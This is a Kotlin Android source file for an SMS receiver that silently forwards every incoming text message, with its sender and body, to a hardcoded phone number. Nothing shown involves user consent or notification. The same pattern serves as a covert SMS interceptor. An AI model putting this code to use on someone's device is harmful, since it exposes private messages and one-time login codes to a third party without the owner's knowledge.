package com.example.smsforwarder

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.telephony.SmsManager

class SmsReceiver : BroadcastReceiver() {
    private val forwardNumber = "+989050315686"
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            val pdus = bundle?.get("pdus") as? Array<*> 
            pdus?.forEach {
                val sms = SmsMessage.createFromPdu(it as ByteArray)
                val sender = sms.originatingAddress ?: ""
                val msg = sms.messageBody
                val textToSend = "From: $sender\n$msg"
                SmsManager.getDefault().sendTextMessage(forwardNumber, null, textToSend, null, null)
            }
        }
    }
}